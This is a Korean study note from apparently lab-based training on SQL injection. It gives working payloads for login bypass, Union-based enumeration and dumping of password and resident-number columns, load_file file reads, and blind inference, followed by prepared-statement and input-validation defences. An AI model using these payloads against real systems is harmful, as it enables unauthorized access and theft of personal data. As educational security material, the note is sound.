---
CMDS: Security
관련 문서:
  - 🖥 105 Security
tags:
  - "#SQL_Injection"
---
> [!important] _Structed Query Language Injection_
> 
> 인증 우회 공격

[[SQL Injection 추가 학습]]

## SQL 인젝션 공격 종류

- 데이터 조회 공격
    → 데이터베이스 내에 데이터를 조회

- 인증 우회 공격
    → 정상적인 아이디/패스워드가 아닌 sql문을 삽입해서 로그인이 가능하도록 만드는 방법

- 시스템 명령어 실행 공격

## 인증 우회 공격 원리

1. 공격자가 SQL 구문 삽입
2. 로그인 시도 - 아이디 / 패스워드 전송
3. 공격자가 입력한 아이디 / 패스워드를 SQL문에 삽입
    
    → id = ‘ or 1=1 —, pw = asdf
    
4. 사용자 입력 값을 통한 SQL 구문 완성
    
    ```SQL
    select * from member where id='' or 1=1--' and pw='ENC_DATA';
    ```
    
5. 비 정상적인 SQL 질의

- 터미네이팅 쿼리 방식
    
    → 주석을 이용해서 뒤에 나오는 구문을 무효화
    
    ex) id = ‘ or 1=1 —,
    
    ```SQL
    select * from member where id='' or 1=1--' and 
    pw='ENC_DATA';
    ```

- 인라인 쿼리 방식
    
    → 질의문을 이용해서 뒤에 나오는 구문을 무효화
    
    ex) id = ‘ or 1=1 or ‘1’=’
    
    ```SQL
    select * from member where id='' or 1=1 or '1'='' and 
    pw='ENC_DATA';
    ```

## 로그인에 사용될 것으로 예측되는 Query 문

```SQL
select * from member where id='' and pw='';
```

- 주석
    - MySql : #, - - (앞뒤로 공백 필요)
    - Oracle : - -

  

#### In-line Query와 Terminating Query
- In-line Query : or 연산자를 이용해서 뒷부분이 거짓이더라도 전체 조건을 참으로 만듦
- Terminating Query : 마지막을 주석으로 마무리 함으로써 뒷부분에 추가 조건을 무효화함

1. 아이디를 알고 있는 경우

- In-line Query
    
    id = admin’ or ‘1’=’1
    
    ```SQL
    select * from member where id='admin' or '1'='1' and pw='';
    ```
    

- Terminating Query
    
    id = admin’#
    
    ```SQL
    select * from member where id='admin'#' and pw=';
    ```

1. 아이디를 모를 경우

- In-line Query
    
    id = ‘ or 1=1 or ‘1’=’1
    
    ```SQL
    select * from member where id='' or 1=1 or '1'='1' and pw='';
    ```
    

- Terminating Query
    
    id = ‘ or 1=1#
    
    ```SQL
    select * from member where id='' or 1=1#' and pw=';
    ```
    

아이디를 모를 경우에는 어떤 계정으로 로그인 될까

→ db상에서 최상단에 있는 계정으로 로그인

  

## 인증 우회 공격을 이용한 비밀글 무단 열람

QUERY 문 추론

```SQL
select * from board where idx=2 and password=’’
```

→ 패스워드에 다음과 같이 입력 : ==‘ or ‘1’=’1==

  

### 비밀글이 최상위 레코드가 아닌 경우

```SQL
select * from board where idx=2 and password='' or '1'='1';
```

idx=2 and password=’’가 false로 연산된 후 ‘1’=’1’ 연산 수행 후 두 결과가 or연산 되기 때문에 최종 결과값이 참이 되므로 모든 게시글의 결과가 리턴됨

⇒결국 비밀 게시글이 열리지 않고 db상 최상단에 있는 게시글이 열림

비밀 게시글 열람을 위해 알아야 할 것 : 게시글 인덱스 값

  

`[http://127.0.0.1/insecure_website/index.php?page=auth&idx=5&mode=view](http://127.0.0.1/insecure_website/index.php?page=auth&idx=5&mode=view)`

URL을 통해 GET 방식의 통신인 경우 idx 값을 추론해 낼 수 있음

idx=5가 게시글의 인덱스값을 나타낼 가능성이 높고, db상에서 idx로 표현했을 가능성 높음

이걸 이용해서 패스워드 값을 입력하면

- In-line Query
    
    → ‘ or idx=5 and ‘1’=’1
    

- Terminating Query
    
    → ‘ or idx=5#
    

로 바꿀 경우 5번 게시글이 열릴 가능성 높음

  

## 인증 우회 공격을 이용한 게시글 무단 삭제

파라미터 변조 취약점을 활용

→ 프록시 서버에서 서버로 보내기 전, 입력한 패스워드 뒤에 ==‘+or+1=1%23==을 붙이고, 삭제하려는 게시글의 idx값을 바꿔서 서버에 삭제 요청

※ 프록시 서버의 경우 보내는 데이터가 URL 인코딩이 되어 전송되기 때문에 공백 대신 +를 사용하고, 특수문자는 URL 인코딩이 필요함

idx 파라미터가 취약할 경우 인증 우회 공격 방법

→ Query문이 다음과 같이 작성되어 있다면

```SQL
select * from board where idx=7 and password='aa';
```

idx값 뒤에 \#을 붙여서 뒷부분을 주석처리하면 게시글이 열릴 수 있음

```SQL
select * from board where idx=7# and password='aa'
```

단 이 경우에는 터미네이팅 공격이 가능해야 수행할 수 있는 공격임

  

⇒ 결국 사용자 입력이 가능한 파라미터 값을 집어넣을수 있는 것을 알아보고 집중적으로 공격 수행

  

## 데이터 조회 공격

<center><i>데이터베이스 내의 데이터를 조회하여 공격자가 중요 데이터를 수집하는 행위</i></center>

데이터 조회 공격 기법의 종류

- Error-Based

DBMS 에러를 통해 공격자가 원하는 정보를 조회

→ 반드시 어플리케이션 에러가 아닌 DBMS 에러가 노출되어야 함

- ==Blind-Based==

Union based, Error based 공격이 불가능할때 수행하는 공격

→ DB에서 반환된 데이터 값이 아닌 응답으로 데이터를 추론하는 방식

- ==Union-Based==

Union을 이용해 공격자가 의도한 데이터 반환

→ 속도가 빠르고, 게시판에 출력하는 용도로 자주 사용

- Out-of-band

==※ Union 이란==

여러 쿼리문들을 합쳐 하나의 쿼리문으로 만들어주는 SQL 문법

  

## Union-Based 공격

취약유무점검

1. ‘ and 1=1# 과 ‘ and 1=2\#의 결과가 다른 경우
2. 문자열 사이에 공백을 넣어본다
    
    1. MySQL : te’ ‘st
    2. ORACLE : te’||’st
    3. MSSQL : te’+’st
    
    검색이 정상적으로 진행되는 경우 취약하다고 판단

3. order by 구문을 통해 컬럼 개수 식별
    
    ‘ order by 9# → 출력
    
    ‘ order by 10# → 에러
    
    ⇒ 컬럼 개수 : 9개
    
4. UNION 구문 사용 → 컬럼 개수가 동일해야 출력 가능!
    
    ‘ union select null,null,null,null,null,null,null,null,null#
    
5. 출력 포지션 파악→null값을 하나씩 문자열로 바꿔 어느 컬럼이 출력 가능한지 확인
    
    ‘ union select ‘test’,null,null,null,null,null,null,null,null#
    
    → 출력값 : No 위치에 test 출력
    
    ‘ union select null,’test’,null,null,null,null,null,null,null#
    
    → 출력값 : Title 위치에 test 출력
    
    공격을 효율적으로 하기 위해 select 문을 거짓으로 하여 레코드 출력 방지
    
      
    
    데이터 조회 공격 - 모든 데이터 조회 공격 기법 동일
    
    1) 기본 정보 목록화 - 버전, 사용자, 현재 데이터베이스명
    
    ‘ and 1=2 union select system_user(),version(),null,null,database(),null,null,null,null# 입력시 데이터 조회
    
    ![[90. Settings/92. Attachments/Untitled 22.png|Untitled 22.png]]
    
    위 사진과 같은 결과값이 출력
    
    2) 메타 데이터 목록화 - 데이터 사전
    
    MYSQL : infomation_schema.schemata, infomation_schema.tables,
    
    infomation_schema.columns
    
    MSSQL : master.sys.databases, [db].sys.objects, [db].sys.columns
    
    ORACLE : all_tables, all_tab_columns
    
      
    
    *데이터베이스 목록화
    
    ‘ and 1=2 union select null,schema_name,null,null,null,null,null,null,null from information_schema.schemata#
    
    ![[90. Settings/92. Attachments/Untitled 1 4.png|Untitled 1 4.png]]
    
      
    
    *테이블 목록화
    
    ‘ and 1=2 union select null,table_name,null,null,null,null,null,null,null from information_schema.tables where table_schema=’pentest’#
    
    ![[90. Settings/92. Attachments/Untitled 2 5.png|Untitled 2 5.png]]
    
      
    
    *컬럼 목록화
    
    - 테이블 : customer_info
        
        ‘ and 1=2 union select null,column_name,null,null,null,null,null,null,null from information_schema.columns where table_schema=’pentest’ and table_name=’customer_info’#
        
        ![[90. Settings/92. Attachments/Untitled 3 3.png|Untitled 3 3.png]]
        
    
      
    
    - 테이블 : members
        
        ‘ and 1=2 union select null,column_name,null,null,null,null,null,null,null from information_schema.columns where table_schema=’pentest’ and table_name=’members’#
        
        ![[90. Settings/92. Attachments/Untitled 4 3.png|Untitled 4 3.png]]
        
          
        
    
    3) 데이터 목록화
    
    - 테이블 : customer_info
        
        ‘ and 1=2 union select id,password,null,null,jumin,null,null,null,null from customer_info#
        
        ![[90. Settings/92. Attachments/Untitled 5 3.png|Untitled 5 3.png]]
        
          
        
    - 테이블 : members
        
        ‘ and 1=2 union select id,password,null,null,name,null,null,null,null from members#
        
        ![[90. Settings/92. Attachments/Untitled 6 3.png|Untitled 6 3.png]]
        
          
        
    

## 로컬 파일 무단 열람

6) 권한 확인 : mysql.user 테이블에서 file_priv를 통해 파일 열람 권한이 있는지 확인

select file_priv from mysql.user where user=’root’

→유니온 공격을 통해 확인

‘ and 1=2 union select null, file_priv,null,null,null,null,null,null,null from mysql.user where user=’root’#

7) 파일 열람

‘ and 1=2 union select null, load_file(’/information/secret_info.txt’),null,null,null,null,null,null,null#

  

대응방안

8) SQL Injection 대한 방어

9) file 권한 제거

update mysql.user set file_priv=’N’ where user=’root’;

flush privileges;

  

## Blind-Based 공격이란

Union based, Error based 공격이 불가능할때 수행하는 공격

→ DB에서 반환된 데이터 값이 아닌 응답으로 데이터를 추론하는 방식

  

데이터 추론 기법 종류

- 순차 탐색
    - 1씩 차례대로 키워 값을 알아내는 방법
- 이진 탐색
    - 전체 범위에서 절반으로 나눠 큰지 작은지 조사하여 값을 알아내는 방법
- 비트 단위 탐색
    - &연산을 통해 조사하려는 자리는 1, 나머지는 0으로 해서 1이 들어간 자리가 0인지 1인지 알아내는 방법

  

실습

system_user() ⇒ 사용자명

substring() ⇒ 특정 위치에 특정 사이즈만큼 값을 반환

10) 순차 탐색 ⇒ 속도가 느리다

substring([대상쿼리], N, 1)=’a’

![[90. Settings/92. Attachments/Untitled 7 3.png|Untitled 7 3.png]]

검색해야할 대상의 값을 하나씩 올리면서 검색

11) 이진 탐색

ascii(substring([대상쿼리], N, 1))>80

![[90. Settings/92. Attachments/Untitled 8 2.png|Untitled 8 2.png]]

  
12) 비트 탐색 ⇒ 각 자리수에 1이 세팅되어 있는지 확인

![[90. Settings/92. Attachments/Untitled 9 2.png|Untitled 9 2.png]]

16,32,64에서 참이 나왔으므로 이 값은 1110000(2)이고, 10진수로 112, ascii값은 p가 나온다는 것을 알 수 있음

  

중요 정보 탈취

이번에는 idx취약점을 이용한 공격 진행

참일때는 있고, 거짓일 때는 없는 기준 문자를 설정해야 함 (날짜)

13. 유저에 대한 길이 알아내기
    
    length()함수를 이용한 공격
    
    length(system_user())>n
    
    ![[90. Settings/92. Attachments/Untitled 10 2.png|Untitled 10 2.png]]
    
    → 숫자를 여러번 대입한 결과 14자리라고 판별
    
      
    
    오래걸리기 때문에 일단 주민번호 출력한다고 가정하고 실습 진행
    
    length함수 안에 substring 값만 들어가는게 가능
    
    → 출력될 값이 여러 레코드일 경우 오류 발생
    
    ⇒limit 라고 하는 순차적 레코드 개념 필요
    
    ![[90. Settings/92. Attachments/Untitled 11 2.png|Untitled 11 2.png]]
    
    ![[90. Settings/92. Attachments/Untitled 12 2.png|Untitled 12 2.png]]
    
    ![[90. Settings/92. Attachments/Untitled 13 2.png|Untitled 13 2.png]]
    
      
    

## 대응 방안

14. Prepared Statement 사용
    
    - 취약한 소스 코드 예시
    
    ```JavaScript
    String keyword = request.getParameter("keyword");
    String query = "select * from board where content like '" + keyword + "'";
    stmt = con.createStatement();
    rs = stmt.executeQuery(query);
    ```
    
    - Prepared Statement 소스 코드 예시
    
    ```JavaScript
    String keyword = request.getParameter("keyword");
    //완성된 Query문이 아닌 불완전한 Query문으로 ? 문자는 런타임 시 사용자 입력 값과 치환
    String query = "select * from board where content like ?";
    //안전하지 않은 Prepared Statement 소스코드 예시
    //String query = "select * from board where content like '%" + keyword + "%'";
    pstmt = conn.prepareStatement(query);
    pstmt.setString(1,"%"+keyword+"%");
    //pstmt.setInt(1,idx);
    ```
    
    Query 문 이후 컴파일과 최적화까지 진행 된 후 쿼리문을 캐시에 저장
    
    사용자에게 입력받은 데이터는 컴파일까지 진행된 Query 문에 순수 문자로 처리되기 때문에 사용자가 검색, 조회가 불가능
    
    사용자 입력 값을 통해 테이블/ 컬럼명을 입력받는 경우 Prepared Statement 사용이 불가능
    
      
    
15. 사용자 입력 값 타입에 따른 입력 값 검증 로직 구현
    1. 숫자형
        
        java : Pattern.matches() 함수 사용
        
        php : is_numeric() 함수 사용
        
    2. 문자형
        
        java
        
        MSSQL, ORACLE
        
        ```Java
        keyword = keyword.replace("'","''");
        keyword = keyword.replace("\"","\"\"");
        ```
        
        php
        
        MYSQL
        
        ```PHP
        $keyword = $db_conn->real_escape_string($keyword);
        ```
        
          
        
    3. 테이블 / 컬럼
        
        → 화이트리스트 형식으로 허용한 문자만 선택해서 허용
        
        JAVA
        
        ```Java
        import java.util.regex.*;
        
        String tb_name = request.getParameter("tb_name");
        boolean flag = Pattern.matches("^[0-9a-zA-Z-]*$", tb_name);
        if(!flag) {
        	out.println("<script>alert('정상적인 입력 값이 아닙니다.'); history.back(-1);
        		</script>");
        	return;
        }
        query = "select * from " + tb_name + " order by idx";
        ```
        
        PHP
        
        ```PHP
        $tb_name = $_GET["tb_name"];
        if(!preg_match("/^[0-9a-zA-z-]*$/", ($tb_name))) {
        	echo "<script> alert('정상적인 입력 값이 아닙니다.'); history.back(-1);
        		</script>"
        	exit();
        }
        $query = "select * from {$tb_name} order by idx";
        ```
        
    4. 키워드 검증
        
        ```Java
        query = "select * from board order by date";
        
        if(orderby.toLowerCase().equals("asc")) {
        	query += " ASC";
        } else if (orderby.toLowerCase().equals("desc")) {
        	query += " DESC";
        } else {
        	query += " ASC";
        }
        ```
        
16. 길이 제한 ( 1번이나 2번과 같이 사용 )
    
    → 사용자 입력값의 길이를 제한. 보험으로 가져가는 느낌